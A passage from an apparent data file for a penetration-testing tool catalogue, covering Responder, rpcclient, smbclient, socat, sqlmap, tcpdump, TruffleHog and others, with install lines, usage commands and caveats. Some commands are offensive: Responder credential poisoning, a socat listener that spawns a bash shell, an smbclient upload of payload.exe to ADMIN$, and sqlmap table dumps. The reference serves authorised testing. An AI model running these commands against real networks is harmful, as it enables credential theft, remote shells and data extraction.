    name: "Responder",
    category: "network",
    summary:
      "Responder answers the name resolution queries that Windows machines broadcast when they cannot find a host, which lets it stand in for the machine they were looking for and harvest the credentials that follow. It speaks LLMNR, NetBIOS and mDNS, and it ships rogue servers for HTTP, SMB, LDAP, SMTP, RDP and more. Testers reach for it when they have a foothold on a network segment but no credentials yet. It is also the cleanest demonstration of why those legacy protocols should be disabled by policy.",
    install: [
      "sudo apt install -y python3 python3-pip python3-netifaces",
      "git clone https://github.com/lgandx/Responder.git && cd Responder && pip3 install -r requirements.txt",
      "sudo python3 Responder.py --help   # confirm the tool runs before touching a live segment",
    ],
    usage: [
      {
        title: "Observe without interfering",
        command: "sudo python3 Responder.py -I <interface> -A -v",
        detail:
          "Analyse mode logs the name resolution traffic on the segment without answering any of it. Run this first to see whether the network is even exposed to poisoning.",
      },
      {
        title: "Run the poisoner",
        command: "sudo python3 Responder.py -I <interface> -v",
        detail:
          "Responder answers failed LLMNR, NetBIOS and mDNS lookups with its own address. Any machine that then authenticates to the name it asked for hands over a NetNTLM hash.",
      },
      {
        title: "Capture HTTP Basic credentials",
        command: "sudo python3 Responder.py -I <interface> -b -v",
        detail:
          "The -b flag makes the rogue HTTP server request Basic authentication instead of NTLM, which yields the password in clear text rather than a hash.",
      },
      {
        title: "Serve a rogue proxy",
        command: "sudo python3 Responder.py -I <interface> -w -v",
        detail:
          "The -w flag starts a WPAD proxy server so browsers configured to auto detect the proxy hand over their credentials on the way out.",
      },
      {
        title: "Enable the rogue DHCP server",
        command: "sudo python3 Responder.py -I <interface> -Pvd",
        detail:
          "Proxy authentication combined with a rogue DHCP server injecting the WPAD record is the most effective combination on a modern network. Configure and disable the modules in Responder.conf before enabling DHCP on anything other than a lab segment.",
      },
    ],
    useCases: [
      "Harvest NetNTLM hashes from a compromised network segment",
      "Prove that LLMNR and NetBIOS name resolution is enabled",
      "Capture clear text credentials from legacy protocols",
      "Demonstrate the risk of automatic proxy discovery",
    ],
    notes:
      "Poisoning name resolution breaks connectivity for every client on the segment while it runs, and it is obvious in the logs of anything with decent monitoring. Current builds also dropped several classic command line flags, so -H no longer starts the HTTP rogue server, and the services you want are enabled in Responder.conf instead.",
  },
  {
    slug: "rpcclient",
    name: "Rpcclient",
    category: "network",
    summary:
      "rpcclient is the command line client for the Microsoft RPC interface, and it is the fastest way to interrogate a domain controller over the same protocol the operating system uses. It enumerates users, groups, shares and printers, and reports domain and server information, all from a single session. Testers reach for it when they want to confirm that a credential really holds the rights people assume it has. It is also useful on its own as a null session check, since modern Windows blocks anonymous access by default and that failure is itself informative.",
    install: [
      "sudo apt install -y samba-common-bin",
      "brew install samba",
      "rpcclient --help   # confirm the client is available on your PATH",
    ],
    usage: [
      {
        title: "Server and domain information",
        command: "rpcclient -U <user>%'<password>' -S <target> -c 'srvinfo'",
        detail:
          "srvinfo reports the domain name, the server version and the server role. It is a good first call because it is cheap and tells you what you are talking to.",
      },
      {
        title: "Enumerate domain users",
        command: "rpcclient -U <user>%'<password>' -S <target> -c 'enumdomusers'",
        detail:
          "This returns the RID and the account name for every user in the domain. The RID column is also the seed for RID brute forcing.",
      },
      {
        title: "Enumerate groups and printers",
        command: "rpcclient -U <user>%'<password>' -S <target> -c 'enumdomgroups' -c 'enumprinters'",
        detail:
          "Group membership often maps directly to privilege, and printers are a common place for stored credentials and for the Print Spooler abuse chain.",
      },
      {
        title: "Test a null session",
        command: "rpcclient -N -S <target> -c 'getdompwinfo'",
        detail:
          "The -N flag sends no credentials at all. If the domain controller answers, anonymous enumeration is still possible and that is worth reporting.",
      },
      {
        title: "Look up a security identifier",
        command: "rpcclient -N -S <target> -c 'lookup_sid <sid>'",
        detail:
          "This translates a security identifier into a name, which is how you confirm whether a low privilege user actually belongs to a privileged group.",
      },
    ],
    useCases: [
      "Enumerate users and groups on a domain controller",
      "Check whether anonymous RPC access is still possible",
      "Resolve security identifiers to account names",
      "Confirm the effective rights of a credential",
    ],
    notes:
      "Anonymous RPC access has been blocked by default since Windows Server 2003 SP2 and on every current release, so an empty result is the expected outcome on a patched system rather than a scanner fault. Several commands still work for any authenticated user, which is why directory permissions matter as much as the protocol itself.",
  },
  {
    slug: "searchsploit",
    name: "Searchsploit",
    category: "vulnerability-management",
    summary:
      "Searchsploit is the local index of the Exploit Database, and it lets you query years of public exploits and proof of concept code without opening a browser. It is the fastest way to answer whether a specific product version has a known public exploit, and each result points at the exact file you can read. Testers reach for it when a service fingerprint turns up an old version and they need to know whether it is exploitable or merely old. The Nmap integration is a nice touch, because it can cross reference an entire scan automatically.",
    install: [
      "sudo git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb && sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit",
      "sudo apt -y install exploitdb",
      "brew install exploitdb",
    ],
    usage: [
      {
        title: "Search for a product",
        command: "searchsploit openssh",
        detail:
          "Results match both the title and the file path, so adding a version narrows the list. Anything published after your local database needs a sync first.",
      },
      {
        title: "Search titles only",
        command: "searchsploit -t 'apache 2.4'",
        detail:
          "The -t flag drops path matches, which removes the noise created by unrelated directories inside the database.",
      },
      {
        title: "Exact version match",
        command: "searchsploit -t -s 'nginx 1.18.0'",
        detail:
          "The -s flag disables fuzzy version ranges, so you get entries for that exact release only. Use it once a scanner has given you a confirmed version.",
      },
      {
        title: "Look up a CVE",
        command: "searchsploit --cve CVE-2021-44228",
        detail:
          "The CVE lookup is the most precise query the tool offers and the one to reach for when a scanner handed you a CVE and you want the reference material.",
      },
      {
        title: "Cross reference a scan",
        command: "searchsploit --nmap nmap-results.xml",
        detail:
          "This walks the services found in an Nmap XML file and prints the matching exploits for each one, which is fast triage across a whole estate.",
      },
    ],
    useCases: [
      "Check whether a service version has a public exploit",
      "Retrieve proof of concept code for a known CVE",
      "Triage an entire Nmap scan for exploitable services",
      "Build a shortlist of exploit sources for a lab",
    ],
    notes:
      "Entries are user submitted and unverified, so a listing says only that someone published code, not that it works or is safe to run, and many of them crash the target. Read the code before running it, keep every test inside a disposable lab, and remember that using a public exploit against a system you are not authorised to test is a criminal act in most jurisdictions regardless of intent.",
  },
  {
    slug: "semgrep",
    name: "Semgrep",
    category: "vulnerability-management",
    summary:
      "Semgrep applies lightweight static analysis rules to source code, matching patterns that security engineers have written for specific languages and frameworks. The rules read like the vulnerability description itself, which makes the output easier to act on than a generic scanner's dump. Testers reach for it when a client wants findings tied to code they can actually fix, or when they need to check a codebase quickly before an assessment. The registry rules cover the OWASP Top Ten, secrets, and framework specific mistakes such as unsafe deserialisation or missing authorisation checks.",
    install: [
      "pip install semgrep",
      "brew install semgrep",
      "docker run --rm -v \"$(pwd)\":/src semgrep/semgrep semgrep --config auto /src",
    ],
    usage: [
      {
        title: "Run the default ruleset",
        command: "semgrep --config p/default /path/to/repo",
        detail:
          "The default ruleset is a reasonable starting point and runs quickly. Scan a specific directory rather than a whole home directory so the results stay relevant.",
      },
      {
        title: "Use a compliance ruleset",
        command: "semgrep --config p/owasp-top-ten /path/to/repo",
        detail:
          "Registry rulesets map findings onto a framework, which makes them easier to report and much easier to track over time.",
      },
      {
        title: "Target a single rule",
        command: "semgrep --config p/python.lang.security.audit.dangerous-subprocess-use /path/to/repo",
        detail:
          "Running one rule at a time is how you verify a specific finding and decide whether that rule deserves a place in your CI pipeline.",
      },
      {
        title: "Export SARIF for the pipeline",
        command: "semgrep --config p/security-audit --sarif --output semgrep.sarif /path/to/repo",
        detail:
          "SARIF plugs into GitHub code scanning and most CI dashboards, which is where findings actually get fixed rather than filed away.",
      },
      {
        title: "Write a rule of your own",
        command: "semgrep --config my-rules/ --test /path/to/repo",
        detail:
          "Semgrep rules are small YAML files with a pattern and a message. Writing one for a house standard takes minutes and is usually worth more than running another public ruleset.",
      },
    ],
    useCases: [
      "Find common injection and misuse patterns in source code",
      "Map findings to OWASP and other framework categories",
      "Add security checks to a CI pipeline with SARIF output",
      "Search for hardcoded secrets and credentials",
    ],
    notes:
      "Every result is a pattern match rather than proof, and the community registry contains rules with known false positives, so treat the output as a list of places to look rather than a list of bugs. Registry rules are third party code that runs on your machine, so pin rule versions and review anything you did not write before letting it into a pipeline.",
  },
  {
    slug: "smbclient",
    name: "Smbclient",
    category: "network",
    summary:
      "smbclient speaks the SMB protocol from the command line and behaves like a minimal file browser, which makes it the most practical way to check what a set of Windows credentials can actually reach. It lists shares, browses directories and reads or writes files over the same ports the operating system uses. Testers reach for it after finding a username and password and needing to know what that opens up. It is also the standard way to move a file onto a Windows host once you have a foothold.",
    install: [
      "sudo apt install -y smbclient",
      "brew install samba",
      "smbclient --version   # confirm the client and the SMB dialect it negotiates",
    ],
    usage: [
      {
        title: "List shares anonymously",
        command: "smbclient -L //<target> -N",
        detail:
          "The -N flag sends no credentials. An answer here means anonymous share listing is enabled, which is worth reporting on its own.",
      },
      {
        title: "List shares with credentials",
        command: "smbclient -L //<target> -U <user>%'<password>'",
        detail:
          "The percent syntax keeps the password out of the command arguments. A server that answers with IPC$ only is normal, and the interesting part is which of the other shares appear.",
      },
      {
        title: "Browse a share",
        command: "smbclient //<target>/<share> -U <user>%'<password>' -c 'ls'",
        detail:
          "Listing is the cheapest way to confirm that a credential works and to see the layout of the data. Add recurse for a deeper walk once you know the scope.",
      },
      {
        title: "Download a file",
        command: "smbclient //<target>/<share> -U <user>%'<password>' -c 'get <file>'",
        detail:
          "Pulling a single file is enough to prove the exposure without copying the whole share. Remember that whatever you download becomes part of your evidence handling.",
      },
      {
        title: "Upload to ADMIN$",
        command: "smbclient //<target>/ADMIN$ -U <user>%'<password>' -c 'put payload.exe'",
        detail:
          "ADMIN$ and C$ give administrative access to the filesystem when the account is local admin. Windows denies access by default, which is the correct behaviour.",
      },
    ],
    useCases: [
      "List and browse SMB shares with a credential",
      "Check whether anonymous share enumeration is possible",
      "Copy files to and from a Windows host",
      "Confirm the actual permissions behind a valid account",
    ],
    notes:
      "Credentials passed on the command line are visible to any other user on the box through the process list, so use a credentials file with -A for anything sensitive. Modern Windows enforces SMB signing and encryption by default, which breaks older relay and named pipe tricks, and many servers block access to ADMIN$ and C$ entirely.",
  },
  {
    slug: "socat",
    name: "socat",
    category: "network",
    summary:
      "Socat is a relay that connects two channels in whatever way you describe on the command line, which makes it far more flexible than a plain netcat. It can chain TCP to UDP, wrap a socket in TLS, forward a port to a remote host, or spawn a shell when a connection arrives. Testers reach for it when they need to build a small tunnel or pivot through a foothold. It also has a long list of options for debugging and non interactive transfers, which makes it a good everyday network utility in its own right.",
    install: [
      "sudo apt install -y socat",
      "brew install socat",
      "socat -V   # print the version and the supported address types",
    ],
    usage: [
      {
        title: "Listener with a shell",
        command: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash -li'",
        detail:
          "Each inbound connection spawns a shell through the EXEC address. This is the standard listener half of a reverse shell, and fork is what lets it handle more than one client.",
      },
      {
        title: "Send a request to a service",
        command: "printf 'GET / HTTP/1.0\\r\\n\\r\\n' | socat - TCP:<target>:80",
        detail:
          "The bare dash means standard input. It is the socat equivalent of piping into netcat, with cleaner handling of the bidirectional stream.",
      },
      {
        title: "TLS client with certificate checks",
        command: "socat - OPENSSL:<domain>:443,verify=1",
        detail:
          "The verify option enables peer certificate validation, which makes this a proper client rather than the permissive TLS wrapper people reach for by mistake.",
      },
      {
        title: "Forward a local port to a remote host",
        command: "socat TCP-LISTEN:8080,reuseaddr,fork TCP:<target>:80",
        detail:
          "This is a port forward in one line and the quickest way to make a remote service reachable from your own machine. Only use it inside a network you are authorised to tunnel.",
      },
      {
        title: "Debug a transfer",
        command: "socat -d -d -x TCP:<target>:443",
        detail:
          "Double debug prints the traffic direction and -x dumps it in hex. When a relay misbehaves, this is usually faster than reading the other end's logs.",
      },
    ],
    useCases: [
      "Create a reverse shell listener",
      "Build a port forward or a pivot",
      "Speak TLS with verification enabled",
      "Bridge protocols such as TCP to UDP",
    ],
    notes:
      "Socat versions before 1.8.0 carry serious local vulnerabilities, including arbitrary file read and write through crafted command lines, so keep it patched. Its traffic is unusual enough to be flagged by most endpoint and network tooling, and the EXEC option spawns whatever you give it, so a stray space in a shell command becomes command injection on your own machine.",
  },
  {
    slug: "sqlmap",
    name: "SQLMap",
    category: "web",
    summary:
      "Sqlmap is an automated injection tool that takes a URL or an HTTP request and works out whether the parameters are injectable, using dozens of techniques and heuristics. It is slow, noisy and unmistakable in the logs, which is exactly why it remains the right tool for proving an injection conclusively. Testers reach for it when manual testing suggested a problem and the finding needs proof with extracted data behind it. It also handles the tedious parts of injection testing, such as enumerating databases, tables and columns.",
    install: [
      "sudo apt install -y sqlmap",
      "git clone https://github.com/sqlmapproject/sqlmap.git",
      "pip install --user sqlmap   # installs the entry point into ~/.local/bin",
    ],
    usage: [
      {
        title: "Test a URL automatically",
        command: "sqlmap -u '<url>' --batch --risk=2 --level=3",
        detail:
          "Risk and level control how aggressive the payloads are and how many techniques are used. Batch mode answers the prompts for you, so choose your parameters before running it.",
      },
      {
        title: "Test one parameter",
        command: "sqlmap -u '<url>' -p 'id' --technique=BEUSTQ --dbs",
        detail:
          "Restricting the test to a single parameter keeps the request count down and the output readable. The --dbs flag enumerates databases once an injection is confirmed.",
      },
      {
        title: "Replay a saved request",
        command: "sqlmap -r request.txt --crawl=3 --batch",
        detail:
          "Feeding a captured request preserves the cookies, headers and body exactly as the application saw them. Crawling adds the in scope pages as additional targets.",
      },
      {
        title: "Pull a table",
        command: "sqlmap -u '<url>' -p 'id' --dbs --tables --dump --level=2 --risk=2",
        detail:
          "Extraction is the part with real consequences. Always point this at a database you are supposed to be testing and never at production data you cannot rebuild.",
      },
      {
        title: "Cover a list of endpoints",
        command: "sqlmap -l urls.txt --batch --threads 4",
        detail:
          "Batch mode over a list of endpoints is how a large application gets covered. Keep the thread count modest or the application will start dropping requests.",
      },
    ],
    useCases: [
      "Confirm a suspected injection with proof and extracted data",
      "Enumerate databases, tables and columns through an injection",
      "Replay a captured request with its full session context",
      "Cover many endpoints in a batch without manual payload crafting",
    ],
    notes:
      "Sqlmap can issue UPDATE and DELETE statements while it tests, so a blind mistake against a live database can destroy data, and the traffic is trivially distinguishable from normal use in any WAF log. Only run it against systems covered by a signed authorisation, and prefer a restored copy of the database for the extraction phase.",
  },
  {
    slug: "subfinder",
    name: "Subfinder",
    category: "recon",
    summary:
      "Subfinder is a passive subdomain enumerator that pulls names from certificate transparency logs, search engines and dozens of other public sources without ever touching the target. Passive matters more than it sounds, because a name collected this way tells you about the organisation's own infrastructure rather than triggering an alert somewhere. Testers reach for it at the very start to build the asset list that everything else runs against. It also supports recursive sources, so a discovered host can lead to further discoveries.",
    install: [
      "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
      "brew install subfinder",
      "docker run --rm -v \"$(pwd)\":/root/.config/subfinder projectdiscovery/subfinder -d <domain> -silent",
    ],
    usage: [
      {
        title: "Enumerate subdomains",
        command: "subfinder -d <domain> -silent -o subs.txt",
        detail:
          "The -silent flag prints only the names and -o writes them to a file. This is the command to run first on a new engagement.",
      },
      {
        title: "Use every source",
        command: "subfinder -d <domain> -all -recursive -o subs.txt",
        detail:
          "The -all flag turns on sources that need an API key and burns through the free quota quickly. Recursive discovery looks for further hosts inside the names it has already found.",
      },
      {
        title: "Scan a list of domains",
        command: "subfinder -dL domains.txt -o all-subs.txt",
        detail:
          "A domain list is the fastest way to cover a holding company with several brands. Deduplicate the output before it goes anywhere near a scanner.",
      },
      {
        title: "Get structured output",
        command: "subfinder -d <domain> -json -o subs.json",
        detail:
          "JSON keeps the source, the record type and the host separated, which is useful for telling a subdomain apart from a resolved address.",
      },
      {
        title: "Resolve before you scan",
        command: "subfinder -d <domain> -silent | dnsx -silent -o live.txt",
        detail:
          "Passive sources return names that may no longer exist. Resolving them with a DNS tool before scanning keeps the target list accurate and cuts the noise.",
      },
    ],
    useCases: [
      "Build the initial asset list for a domain",
      "Find hosts hidden from the main website",
      "Collect subdomain names for certificate and DNS review",
      "Find forgotten staging and development hosts",
    ],
    notes:
      "Because every source is passive, subfinder cannot see hosts that were never published in a public log, and it returns plenty of names that no longer resolve, so always resolve before you scan. The most productive sources require API keys and each has its own rate limit and terms of service, which is worth reading before a large run.",
  },
  {
    slug: "syft",
    name: "Syft",
    category: "container",
    summary:
      "Syft generates a software bill of materials for a container image, a directory or a package, listing every package it can find with versions and licences. That inventory is what turns a vague question about a build into a concrete list of things to look up. Testers reach for it when they want the exact component versions inside a running container without registry access. The output formats, including SPDX and CycloneDX, feed directly into vulnerability scanners and procurement workflows.",
    install: [
      "brew install syft",
      "curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin",
      "go install github.com/anchore/syft/cmd/syft@latest",
    ],
    usage: [
      {
        title: "Inventory a container image",
        command: "syft <image> -o spdx-json > sbom.spdx.json",
        detail:
          "SPDX is the format most compliance tooling expects. Syft reads the image filesystem directly, so the registry does not need to still serve the tag.",
      },
      {
        title: "Inventory a directory",
        command: "syft dir:. -o cyclonedx-json",
        detail:
          "Scanning a working tree gives you the dependency list of a repository, including language manifests such as package-lock.json and go.sum.",
      },
      {
        title: "Scan a remote registry",
        command: "syft registry:<registry>/<repo>:<tag> -o syft-json",
        detail:
          "The registry prefix makes Syft pull the manifest and layers from a remote registry, which is how you inventory a tag that is not running anywhere.",
      },
      {
        title: "Filter the output",
        command: "syft <image> -o json | jq '.artifacts[] | select(.type == \"npm\") | .name'",
        detail:
          "The JSON output is a full artifact list, so you can pull out exactly the ecosystem you care about. Useful when a mixed language image produces a very long inventory.",
      },
      {
        title: "Exclude the noise",
        command: "syft <image> --exclude './usr/share/doc/*' -o table",
        detail:
          "Excluding paths keeps the inventory readable and shrinks the file. The table format is the quickest way to eyeball what is inside an image.",
      },
    ],
    useCases: [
      "Inventory the packages inside a container image",
      "Produce an SPDX or CycloneDX bill of materials",
      "Identify exact component versions for vulnerability lookup",
      "Check a repository's dependency tree",
    ],
    notes:
      "An SBOM records what is present, not what is actually running, so a package on disk that the application never loads is still listed, while a vulnerable library loaded from a shared volume is not. Syft also misses software that carries no package metadata, such as a binary copied straight into a layer, so treat the inventory as a strong starting point rather than a complete picture.",
  },
  {
    slug: "tcpdump",
    name: "Tcpdump",
    category: "network",
    summary:
      "tcpdump is the packet capture tool everything else is measured against, and it is still the right first choice when you need to see exactly what is on the wire. It attaches to an interface, filters by protocol and address, and writes a capture file that any analysis tool can read later. Testers reach for it to confirm what a protocol is really doing, to prove that clear text credentials are exposed, or to capture a handshake for a later replay. It handles the raw capture; the interpretation is where the real work starts.",
    install: [
      "sudo apt install -y tcpdump",
      "brew install tcpdump",
      "sudo setcap cap_net_raw,cap_net_admin=eip $(which tcpdump)   # capture without root",
    ],
    usage: [
      {
        title: "Capture everything to a file",
        command: "sudo tcpdump -i <interface> -nn -s 0 -w capture.pcap",
        detail:
          "The -s 0 flag stops truncation so you keep whole packets, and -nn removes name lookups that would otherwise slow the capture down. The pcap file is the artefact you attach to the report.",
      },
      {
        title: "Watch one service",
        command: "sudo tcpdump -i <interface> -nn port 445 -A",
        detail:
          "Printing the payload as text is how you read a banner or a clear text credential straight off the wire. Scope the filter tightly or the console will drown in output.",
      },
      {
        title: "Find SYN scans",
        command: "sudo tcpdump -i <interface> -nn 'tcp[tcpflags] & tcp-syn != 0'",
        detail:
          "This is the classic filter for spotting a port scan in real time, and a good way to show a client exactly what their own IDS sees.",
      },
      {
        title: "Save and read live",
        command: "sudo tcpdump -i any -nn -l | tee live-traffic.txt",
        detail:
          "The -l flag flushes each line so the output can be piped into grep or a log collector while the capture is still running.",
      },
      {
        title: "Re-read an existing capture",
        command: "tcpdump -r capture.pcap -nn -A 'port 80'",
        detail:
          "Reading a pcap file needs no privileges and no live interface. It is the right way to re-examine evidence after the fact, including files supplied by a client.",
      },
    ],
    useCases: [
      "Capture traffic for a report and replay it later",
      "Prove that a protocol carries clear text credentials",
      "Observe scanning or brute force traffic on a segment",
      "Record a handshake for protocol analysis",
    ],
    notes:
      "Capture files contain live secrets from every clear text protocol, so treat them as evidence with a chain of custody rather than as scratch data. On a switched network you only see your own traffic unless you are on the same segment or performing a legitimate interception, and capturing without root needs the capabilities set out above.",
  },
  {
    slug: "the-harvester",
    name: "theHarvester",
    category: "recon",
    summary:
      "theHarvester collects the names that surround a domain from public sources: subdomains, email addresses, hostnames in certificate logs, URLs and people. It is a way of asking the internet what it already knows about an organisation, without sending a single packet to the target. Testers reach for it at the start of an engagement to build a name list for scope, and to find the forgotten hosts a Google search misses. The newer releases are organised around explicit source names and activity classes, which makes a run reproducible.",
    install: [
      "sudo apt install -y theharvester",
      "git clone https://github.com/laramies/theHarvester.git && cd theHarvester && uv sync",
      "# provider keys live in ~/.theHarvester/api-keys.yaml",
    ],
    usage: [
      {
        title: "Query passive sources",
        command: "theHarvester -d <domain> -b crtsh,certspotter",
        detail:
          "Certificate transparency logs need no API key and are the most reliable starting point. Each source reports its own outcome, so a source that fails is visible rather than silently empty.",
      },
      {
        title: "Run every passive source",
        command: "theHarvester -d <domain> -b all -f harvest-report",
        detail:
          "This queries the full catalogue of passive providers. It is slower than it looks and many of them rate limit aggressively, so expect partial results.",
      },
      {
        title: "Collect by capability",
        command: "theHarvester -d <domain> -b subdomains,emails",
        detail:
          "Capability selectors pick the sources that can contribute a result type and can be mixed with explicit source names. The -f flag writes JSONL, JSON and XML reports.",
      },
      {
        title: "Resolve the names",
        command: "theHarvester -d <domain> -b crtsh,certspotter -r",
        detail:
          "The -r flag resolves the discovered hosts so you end up with addresses rather than names. Resolution is an active step, so only enable it for targets you are authorised to query.",
      },
      {
        title: "Store provider API keys",
        command: "nano ~/.theHarvester/api-keys.yaml",
        detail:
          "Many providers need a key and a paid tier for anything beyond a handful of queries. Filling in this file is what unlocks the sources that return the most complete data.",
      },
    ],
    useCases: [
      "Build a scope list of hostnames from public sources",
      "Collect email addresses for phishing simulation briefings",
      "Find forgotten subdomains and staging hosts",
      "Gather URLs and host data for asset inventory",
    ],
    notes:
      "Search engines and data providers throttle aggressively, so a run that returns nothing usually means it was rate limited rather than that the organisation has no footprint. Harvesting personal addresses and using them in any follow on activity carries privacy obligations in most jurisdictions, so agree in writing what the data will be used for before you collect it.",
  },
  {
    slug: "trivy",
    name: "Trivy",
    category: "vulnerability-management",
    summary:
      "Trivy scans container images, filesystems, Kubernetes clusters and repositories for known vulnerabilities, misconfigurations and secrets, using a database of advisories that is downloaded and refreshed locally. It is fast because it reads the layers of an image directly instead of booting anything. Testers reach for it to put a version number on a running container before deciding whether it matters. The same database drives infrastructure as code checks, so one tool covers the application and the platform around it.",
    install: [
      "brew install trivy",
      "curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin",
      "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image <image>",
    ],
    usage: [
      {
        title: "Scan an image",
        command: "trivy image <image> --severity HIGH,CRITICAL",
        detail:
          "Severity filtering keeps the report to the issues that justify action. The first run downloads the vulnerability database, which needs internet access and takes a few minutes.",
      },
      {
        title: "Scan a directory",
        command: "trivy fs --scanners vuln,secret,license .",
        detail:
          "Scanning a repository catches dependencies with known advisories and secrets committed to source control. The secret scanner is noisy on test fixtures, so expect to filter some hits.",
      },
      {
        title: "Scan a cluster",
        command: "trivy k8s cluster --report summary",
        detail:
          "This reads the cluster through your kubeconfig and reports misconfigurations in the workloads. Running it with cluster admin rights changes what you can see.",
      },
      {
        title: "Produce machine readable output",
        command: "trivy image <image> --format json --output trivy.json",
        detail:
          "JSON output is what you want for a pipeline or a central findings store, and it includes the exact package and advisory identifier behind each finding.",
      },
      {
        title: "Scan an existing SBOM",
        command: "trivy sbom sbom.spdx.json",
        detail:
          "Feeding a Syft generated SBOM to Trivy avoids re-reading the image and is the fast way to re-evaluate a build against a newer database.",
      },
    ],
    useCases: [
      "Find known CVEs in a running container image",
      "Scan a repository for vulnerable dependencies and leaked secrets",
      "Check Kubernetes workload configuration",
      "Re-evaluate an SBOM against a refreshed advisory database",
    ],
    notes:
      "Results depend on the freshness of the local database and on Trivy's ability to identify the operating system inside the image, so distroless and hand built images produce both missed and spurious findings. The severity comes from the advisory rather than from whether the vulnerable code path is reachable, which is why the output always needs a human triage pass.",
  },
  {
    slug: "trufflehog",
    name: "TruffleHog",
    category: "vulnerability-management",
    summary:
      "TruffleHog looks for credentials that should not be in your code, and unlike a regular secret scanner it tries to verify each one against the provider that issued it. That verification step is the whole point, because it separates a live API key from an expired one and a test value from a working credential. Testers reach for it after a breach to find out whether anything actually leaked, and before a release to check the history of a repository. It scans working trees, git history, images and cloud storage alike.",
    install: [
      "brew install trufflehog",
      "go install github.com/trufflesecurity/trufflehog/v3@latest",
      "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock trufflesecurity/trufflehog:latest filesystem /",
    ],
    usage: [
      {
        title: "Scan a directory",
        command: "trufflehog filesystem ./",
        detail:
          "The filesystem command walks the tree and checks every file it recognises. It is the right starting point for a workstation or an extracted archive.",
      },
      {
        title: "Scan the git history",
        command: "trufflehog git file://. --only-verified",
        detail:
          "Scanning the history catches keys that were committed and later deleted. The --only-verified flag keeps the output to credentials that still work.",
      },
      {
        title: "Scan a container image",
        command: "trufflehog docker --image <image> --only-verified",
        detail:
          "Image scanning looks inside the layers for baked in credentials. It needs access to the Docker socket, so run it on a host you control.",
      },
      {
        title: "Export findings as JSON",
        command: "trufflehog filesystem ./ --json > findings.json",
        detail:
          "JSON keeps the secret, its source location and the verification result together. Redact the output before it goes anywhere near a ticket system.",
      },
      {
        title: "Search a hosted provider",
        command: "trufflehog github --org=<org> --only-verified",
        detail:
          "Provider mode pulls directly from a hosted service and verifies the keys it finds there. The verification itself makes API calls, which is worth telling the client about.",
      },
    ],
    useCases: [
      "Confirm whether a committed credential is still live",
      "Search git history for keys that were deleted but remain in commits",
      "Check container images for baked in secrets",
      "Triage a breach for exposed keys",
    ],
    notes:
      "Unverified findings are the largest source of noise, because a pattern that looks like a key is often a placeholder, so keep --only-verified on unless you have a reason to look at the rest. Finding a secret is not the same as fixing it, because the value stays valid until it is rotated, and every secret that appears in a scan report should be treated as compromised from that moment on.",
  },
  {
    slug: "tshark",
    name: "TShark",
    category: "network",
    summary:
      "Tshark is the command line face of Wireshark, and it is what you use when you want the power of a full protocol dissector without the graphical interface. It can filter a capture down to a handful of fields, count the protocols in a file, or follow a single TCP stream. Testers reach for it to pull credentials out of a capture, to prove what an application really sent, or to check what a suspicious connection contained. Because it outputs plain text, it fits into scripts and pipelines that the Wireshark GUI cannot.",
    install: [
      "sudo apt install -y tshark",
      "brew install --cask wireshark",
      "docker run --rm -v \"$(pwd)\":/data ghcr.io/wireshark/wireshark-cli tshark -r data/capture.pcap",
    ],
    usage: [
      {
        title: "Extract HTTP request fields",
        command: "tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri",
        detail:
          "The display filter narrows the capture and -T fields extracts exactly the columns you want. This is the fastest way to build a URL list out of a capture.",
      },
      {
        title: "Pull credentials from a stream",
        command: "tshark -r capture.pcap -Y 'http' -T fields -e http.authorization -e http.file_data",
        detail:
          "Field extraction on a protocol that carries secrets in clear text gives you the values without reading hex dumps by hand.",
      },
      {
        title: "Follow one TCP conversation",
        command: "tshark -r capture.pcap -q -z follow,tcp,ascii,0",
        detail:
          "The follow filter prints a single stream as ASCII, which reads like a terminal session. It is the quickest way to understand an entire exchange.",
      },
      {
        title: "Summarise a capture",
        command: "tshark -r capture.pcap -q -z io,phs",
        detail:
          "The protocol hierarchy statistic shows which protocols dominate a file. A capture that is mostly SMB and HTTP looks very different from one that is mostly Kerberos.",
      },
      {
        title: "Capture live traffic",
        command: "sudo tshark -i <interface> -f 'tcp port 443' -w https.pcap",
        detail:
          "The capture filter limits what is written to disk, which keeps the file small. Remember that tshark and Wireshark share the same capture permissions.",
      },
    ],
    useCases: [
      "Extract URLs and parameters from a packet capture",
      "Read credentials from clear text protocols in a capture",
      "Reconstruct a single TCP conversation",
      "Summarise the protocol mix of an incident capture",
    ],
    notes:
      "Tshark's display filters are not BPF capture filters, and mixing the two up is the most common beginner mistake, so put -f before the capture and -Y after it. It also needs capture privileges on a live interface, and the tshark package asks about dump capabilities during installation, which is worth answering correctly on a shared machine.",
  },
];
